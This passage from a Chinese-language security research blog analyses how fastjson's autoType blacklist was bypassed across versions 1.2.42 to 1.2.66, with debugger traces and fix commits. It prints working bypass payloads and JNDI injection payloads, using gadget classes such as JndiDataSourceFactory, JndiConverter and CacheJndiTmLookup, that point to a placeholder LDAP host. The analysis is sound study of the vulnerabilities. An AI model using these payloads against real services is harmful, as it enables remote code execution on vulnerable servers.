<p>答案是当然可以，这个绕过点就体现在<code>1.2.43</code>版本中</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1242">fastjson 1.2.42<a href="#fastjson-1242" class="hash-link" aria-label="fastjson 1.2.42的直接链接" title="fastjson 1.2.42的直接链接">​</a></h2>
<p>1.2.41问题出现后，1.2.42中尝试了修复，修复方式</p>
<ul>
<li><a href="https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf" target="_blank" rel="noopener noreferrer">https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf</a></li>
</ul>
<blockquote>
<p>寻找历史commit技巧：</p>
<ol>
<li>release里面找对应的版本的commit</li>
<li>直接搜索commit</li>
<li>直接搜索issue</li>
</ol>
</blockquote>
<p>可以明显的看到，给原来的<code>denyList</code>变成了<code>denyHashCodes</code>，让安全研究更难了，但是hashcode的方法是公开的，只要jar包够多还是可以碰撞出来的，感觉治标不治本。。。</p>
<p><img decoding="async" loading="lazy" alt="image-20211018163545228" src="/assets/images/image-20211018163545228-db984252dbf2f697ffffcc9f0d8adad2.png" width="2504" height="1748" class="img_ev3q"></p>
<p>同时可以看到针对漏洞绕过的修复方式，很简单粗暴，如果发现开头是<code>L</code>而且结尾是<code>;</code>，就直接去掉</p>
<p><img decoding="async" loading="lazy" alt="image-20211018163819940" src="/assets/images/image-20211018163819940-1e8fc319b0ffd47b84690d32e8843d87.png" width="2780" height="1948" class="img_ev3q"></p>
<p>所以绕过方式也很简单，直接用2个<code>L</code>和2个<code>;</code>就可以了，Payload如下</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;LLorg.example.User;;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;age&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;username&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;test&quot;</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1243">fastjson 1.2.43<a href="#fastjson-1243" class="hash-link" aria-label="fastjson 1.2.43的直接链接" title="fastjson 1.2.43的直接链接">​</a></h2>
<p>对<code>LL;;</code>可以绕过的情况做了过滤，如果只有一个<code>L;</code>，就去除了后再走黑名单去过滤看看是否允许反序列化，着实太恶心了看着</p>
<p><img decoding="async" loading="lazy" alt="image-20211018165402854" src="/assets/images/image-20211018165402854-5e4c20cca605b294856edb55486e216b.png" width="3584" height="2240" class="img_ev3q"></p>
<p>所以2个<code>LL;;</code>是行不通了，但是别忘了我们在分析<code>1.2.41</code>的时候，发现还会去掉<code>[</code>然后实例化，这就是绕过点</p>
<p>初始<code>payload</code></p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;[org.example.User&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;age&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;username&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;test&quot;</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>报错<code>exepct &#x27;[&#x27;, but ,, pos 29, json : {&quot;@type&quot;:&quot;[org.example.User&quot;,&quot;age&quot;:66,&quot;username&quot;:&quot;test&quot;}</code>，29那个位置，期望一个<code>[</code>，但是是<code>,</code>，所以我们加一个<code>[</code></p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;[org.example.User&quot;</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;age&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;username&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;test&quot;</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>报错<code>syntax error, expect {, actual string, pos 30, fastjson-version 1.2.43</code>，期望30的位置是一个<code>{</code>，加上</p>
<p>最终POC</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;[org.example.User&quot;</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;age&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;username&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;test&quot;</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<hr>
<p>看着有点迷，为啥加上<code>[{</code>就可以了？</p>
<p>分析一下，通过<code>checkAutoType</code>后，返回class <code>[Lorg.example.User;</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211018174432006" src="/assets/images/image-20211018174432006-07fdea52a1f1015a4cc2933cf0e2aa07.png" width="3584" height="2240" class="img_ev3q"></p>
<p>一直跟，发现调用了<code>deserializer.deserialze</code>，跟进去，发现使用了<code>clazz.getComponentType()</code>，是不是很眼熟？就是前面去掉<code>[</code>的那个地方</p>
<p><img decoding="async" loading="lazy" alt="image-20211018175652722" src="/assets/images/image-20211018175652722-f592330e438e9c9351e21ad44914f429.png" width="2746" height="566" class="img_ev3q"></p>
<p>这个函数是<code>native</code>的，所以看不到代码。。。不过根据结果来看，就是去掉<code>[L</code>和<code>;</code>拿到类</p>
<p><img decoding="async" loading="lazy" alt="image-20211018175831714" src="/assets/images/image-20211018175831714-aa2d539bc8659d4278409f6504c408b5.png" width="928" height="748" class="img_ev3q"></p>
<p>再继续往下，跟进<code>parseArray</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211019111527308" src="/assets/images/image-20211019111527308-076511a61cbcc2fc011fd2fe9392c4fe.png" width="3584" height="2240" class="img_ev3q"></p>
<p>发现如果<code>token != 14</code>就会抛出错误，而没有<code>[</code>的时候，token是16，所以会报错，<code>{</code>也类似，可以下个异常断点来分析</p>
<p><img decoding="async" loading="lazy" alt="image-20211019111739224" src="/assets/images/image-20211019111739224-206e5acb96b46b386f3c9d94ac0d6e0a.png" width="3584" height="2240" class="img_ev3q"></p>
<p>最后看下到<code>setXXX</code>的运行堆栈信息，结合堆栈来分析可以节约很多时间</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">setUsername:20, User (org.example)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:498, Method (java.lang.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseField:118, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseField:1061, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:756, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseArray:729, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:183, ObjectArrayCodec (com.alibaba.fastjson.serializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseObject:373, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:1338, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:1304, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:152, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:162, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:131, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseObject:223, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main:10, App (org.example)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1245">fastjson 1.2.45<a href="#fastjson-1245" class="hash-link" aria-label="fastjson 1.2.45的直接链接" title="fastjson 1.2.45的直接链接">​</a></h2>
<p>1.2.44中对<code>[</code>进行了判断，我们用1.2.43的POC，然后下个<code>JSONException</code>的异常断点，看看是怎么判断的</p>
<p>运行后，在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>成功拦截</p>
<p>分析一下，发现如果开头是<code>[</code>就直接抛出异常</p>
<p><img decoding="async" loading="lazy" alt="image-20211019113013730" src="/assets/images/image-20211019113013730-7b895ae54c1a8459a91c3b98d6a7c8a5.png" width="2588" height="604" class="img_ev3q"></p>
<p>那再看看<code>1.2.41</code>里面的绕法呢，前面加个L，后面加个;，发现会检查结尾是否为<code>;</code>，是的话也抛出异常</p>
<p><img decoding="async" loading="lazy" alt="image-20211019113246791" src="/assets/images/image-20211019113246791-aa3f59e67626caf4b1e48f77b12457bf.png" width="2728" height="274" class="img_ev3q"></p>
<p>当然这个版本既然有RCE，肯定不是之前的方法绕过的，这次是通过不在黑名单里面的类来绕过的</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;properties&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;data_source&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;ldap://x.x.x.x/Exp&quot;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1247">fastjson 1.2.47<a href="#fastjson-1247" class="hash-link" aria-label="fastjson 1.2.47的直接链接" title="fastjson 1.2.47的直接链接">​</a></h2>
<p>这个版本绕过了<code>autoTypeSupport</code>检测，<strong>不开启<code>ast</code>依然可以利用</strong>（1.2.25 - 1.2.45 这些绕过都是需要开启<code>ast</code>的）</p>
<p>Payload：</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;a&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;java.lang.Class&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;val&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;org.example.User&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;b&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;org.example.User&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;username&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;123456&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;age&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">123</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211019134809436" src="/assets/images/image-20211019134809436-1cbb95117eb5767a59e87b254c0efb5c.png" width="1520" height="1910" class="img_ev3q"></p>
<p>绕过原理：</p>
<ol>
<li>利用到了<code>java.lang.class</code>，这个类不在黑名单，所以checkAutotype可以过</li>
<li>这个<code>java.lang.class</code>类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中</li>
<li>如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回</li>
</ol>
<p>debug分析：</p>
<p>在<code>setXXX</code>的地方下断点，运行看下调用堆栈信息</p>
<div class="language-stack codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-stack codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">setUsername:28, User (org.example)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:498, Method (java.lang.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseField:124, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseField:1078, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseObject:544, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:152, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:162, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parse:131, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseObject:223, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main:20, App (org.example)</span><br></span></code></pre></div></div>
<p>进入到<code>parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)</code>开始下断点重新运行分析</p>
<p><img decoding="async" loading="lazy" alt="image-20211019135922437" src="/assets/images/image-20211019135922437-5e790a39bdba92ab02b8a5f13756ec65.png" width="2324" height="140" class="img_ev3q"></p>
<p>跟进，一直F8，识别到传入的参数<code>a</code>，继续向下，识别到后面还是<code>{</code>开头后，递归调用<code>parseObject</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211019141156960" src="/assets/images/image-20211019141156960-8d458da037dc367cd8efd8b987b5471e.png" width="2094" height="142" class="img_ev3q"></p>
<p>继续往后识别到<code>@type</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211019141134302" src="/assets/images/image-20211019141134302-00bb6d67511c2067a19d89f39399cbb9.png" width="2626" height="1274" class="img_ev3q"></p>
<p>然后就是进入<code>checkAutoType</code>检查，因为<code>java.lang.Class</code>在<code>this.deserializers.buckets</code>里面，所以直接返回了<code>class java.lang.Class</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211019141508554" src="/assets/images/image-20211019141508554-aedf35d49d4b0d5fb840de8f2c6f2243.png" width="2156" height="676" class="img_ev3q"></p>
<p>通过了<code>checkAutoType</code>检查后，常规调用<code>deserializer.deserialze</code>进行反序列化，但这里是<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211019142033137" src="/assets/images/image-20211019142033137-2006dac58afc30e67be28c46ac8cd520.png" width="3416" height="490" class="img_ev3q"></p>
<p>这里会取出我们的变量<code>val</code>的值，也是我们传入的恶意类</p>
<p><img decoding="async" loading="lazy" alt="image-20211019142209350" src="/assets/images/image-20211019142209350-554f9b368bc6bfcbbee1ea4ca0e61b63.png" width="2100" height="1376" class="img_ev3q"></p>
<p>然后就是一系列的Class的判断，一直到<code>Class.class</code>，然后会进入<code>loadClass</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211019142451414" src="/assets/images/image-20211019142451414-8462889dfc8b8a72e182cde39553953d.png" width="2548" height="1844" class="img_ev3q"></p>
<p>跟进<code>loadClass</code>，一直跟，发现在<code>cache</code>为<code>true</code>的时候，会直接给咱们的恶意类加入到<code>mappings</code>中，而这个<code>mappings</code>是不是看着很眼熟？后面分析</p>
<p><img decoding="async" loading="lazy" alt="image-20211019143113366" src="/assets/images/image-20211019143113366-e09558dbdab905d755d036cc8c938e9f.png" width="2834" height="1672" class="img_ev3q"></p>
<p>这个<code>cache</code>默认就是为<code>true</code></p>
<p><img decoding="async" loading="lazy" alt="image-20211019143230077" src="/assets/images/image-20211019143230077-2c6ca76759f5b5a290e2920af39b0dfa.png" width="2424" height="362" class="img_ev3q"></p>
<hr>
<p>然后开始处理字段<code>b</code>，和上面类似，我们一直到<code>checkAutoType</code></p>
<p>可以看到此处如果开启了<code>autoTypeSupport</code>检查会进入黑名单检查，反而影响我们的payload</p>
<p><img decoding="async" loading="lazy" alt="image-20211019143910079" src="/assets/images/image-20211019143910079-57e65dc4c295179ce90dfaa998482686.png" width="3554" height="1080" class="img_ev3q"></p>
<p>跟进下方的<code>getClassFromMapping</code>，可以看到就是上面我们添加恶意类的那个<code>Mapping</code>，从此绕过了<code>checkAutoType</code>检查</p>
<p><img decoding="async" loading="lazy" alt="image-20211019144040431" src="/assets/images/image-20211019144040431-4edba5f2da95849e58d89db0b4cb468d.png" width="2776" height="1708" class="img_ev3q"></p>
<p>到此差不多就结束了，大佬就是大佬，太牛了</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1262">fastjson 1.2.62<a href="#fastjson-1262" class="hash-link" aria-label="fastjson 1.2.62的直接链接" title="fastjson 1.2.62的直接链接">​</a></h2>
<p>1.2.47后肯定修复了，怎么修的呢？我们用1.2.62去试试1.2.47的POC</p>
<p><img decoding="async" loading="lazy" alt="image-20211019144524663" src="/assets/images/image-20211019144524663-dd125c6e96a7619bd27bcff4ae468d35.png" width="1952" height="506" class="img_ev3q"></p>
<p>抛出了一场，然后下个异常断点，分析一下，看样子是前面某个地方设置了<code>autoTypeSupport</code>的值</p>
<p><img decoding="async" loading="lazy" alt="image-20211019144556394" src="/assets/images/image-20211019144556394-8f13b93e181567ece5d78e2d55edddb5.png" width="2218" height="630" class="img_ev3q"></p>
<p>咱们追踪一下这个变量，下个字段断点</p>
<p><img decoding="async" loading="lazy" alt="image-20211019144721234" src="/assets/images/image-20211019144721234-baacec6de3f0d0fc76039ced62190934.png" width="1296" height="746" class="img_ev3q"></p>
<p>发现来源是这</p>
<p><img decoding="async" loading="lazy" alt="image-20211019145126165" src="/assets/images/image-20211019145126165-aaa53127276938abee98bf6583596344.png" width="1472" height="518" class="img_ev3q"></p>
<p>跟一下<code>AUTO_SUPPORT</code>，原来是从配置文件里面读是否开启了<code>autoTypeSupport</code>。。。大意了</p>
<p><img decoding="async" loading="lazy" alt="image-20211019145206763" src="/assets/images/image-20211019145206763-93b0428caad4065658017e864df7bb69.png" width="1852" height="840" class="img_ev3q"></p>
<p>那我们开启ast后再试试</p>
<p>结果就是<code>java.lang.Class</code>被加入到了黑名单</p>
<p><img decoding="async" loading="lazy" alt="image-20211019145538022" src="/assets/images/image-20211019145538022-deb7844f6f8c17c7fd5c966116139487.png" width="3526" height="510" class="img_ev3q"></p>
<p>据说修复还将<code>cache</code>默认设置为<code>false</code>了，去<code>TypeUtils</code>类看看，发现确实如此</p>
<p><img decoding="async" loading="lazy" alt="image-20211019150123136" src="/assets/images/image-20211019150123136-49a9e6424fa0c4501262a3a8c60e3c2e.png" width="1934" height="1370" class="img_ev3q"></p>
<hr>
<p>1.2.62的RCE也很简单，由于<code>CVE-2020-8840</code>的gadget绕过了fastjson的黑名单而导致的，当服务端存在收到漏洞影响的xbean-reflect依赖并且开启fastjson的autotype时，远程攻击者可以通过精心构造的请求包触发漏洞从而导致在服务端上造成远程命令执行的效果。</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;@type&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token property" style="color:#36acaa">&quot;AsText&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;ldap://x.x.x.x/Exp&quot;</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1266">fastjson 1.2.66<a href="#fastjson-1266" class="hash-link" aria-label="fastjson 1.2.66的直接链接" title="fastjson 1.2.66的直接链接">​</a></h2>
<p>和1.2.62类似，在开启AutoType的情况下，由于黑名单过滤不全而导致的绕过问题</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">{&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://x.x.x.x/Exp&quot;}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson-1268">fastjson 1.2.68<a href="#fastjson-1268" class="hash-link" aria-label="fastjson 1.2.68的直接链接" title="fastjson 1.2.68的直接链接">​</a></h2>
<p>这个文档太大了太卡了，后面单独分析</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson黑名单">fastjson黑名单<a href="#fastjson黑名单" class="hash-link" aria-label="fastjson黑名单的直接链接" title="fastjson黑名单的直接链接">​</a></h2>
<blockquote>
<p>参考<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener noreferrer">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
</blockquote>
<p><code>fastjson</code> 在1.2.42开始，把原本明文的黑名单改成了哈希过的黑名单，防止安全研究者对其进行研究。在 <a href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" target="_blank" rel="noopener noreferrer">https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd</a> 这次commit中体现出来。</p>
